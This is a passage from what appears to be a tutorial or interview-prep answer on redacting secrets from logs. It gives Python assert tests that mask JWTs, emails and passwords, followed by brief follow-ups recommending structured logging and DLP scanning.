assert redact("id_token eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ1MSJ9.c2ln seen") == "id_token [JWT] seen"
assert redact("notify maria.lopez@acme.example about run r-7") == "notify [EMAIL] about run r-7"
assert redact("PASSWORD=hunter2&user=bob") == "PASSWORD=[REDACTED]&user=bob"
assert redact("run r-7 finished in 3.2s") == "run r-7 finished in 3.2s"  # nothing to hide, nothing changed
```

Complexity: O(n) per line for each rule.

#### Follow-ups

- **Is regex redaction enough?** No: it is a safety net. The primary control is structured logging where sensitive fields are typed and never logged, plus DLP scanning (for example Sensitive Data Protection on GCP) for what slips through.
- **Where does it run?** In the logging layer (a formatter or processor), so every log call is covered, not in each call site.
